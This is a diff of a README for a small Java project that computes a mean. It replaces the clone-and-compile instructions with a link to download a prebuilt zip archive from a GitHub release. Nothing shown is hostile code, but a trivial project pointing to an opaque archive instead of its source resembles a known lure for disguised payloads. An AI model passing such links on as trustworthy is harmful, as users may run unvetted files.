@@ -48,31 +48,12 @@ Where:
 
 ---
 
-## ▶️ How to Run
+## 📦 Mean Function Download
 
-1. Clone the repository:
+Download the Mean function here:
 
-   ```bash
-   git clone https://github.com/your-username/mean-function.git
-   ```
+👉 https://github.com/Akash-Wakade-7008-alt/Maths-Functions/releases/download/Mean-Function-v1.0/Mean-Function.zip
 
-2. Navigate to the project folder:
-
-   ```bash
-   cd mean-function
-   ```
-
-3. Compile the Java files:
-
-   ```bash
-   javac Main.java Mean.java
-   ```
-
-4. Run the program:
-
-   ```bash
-   java Main
-   ```
 
 ---
 
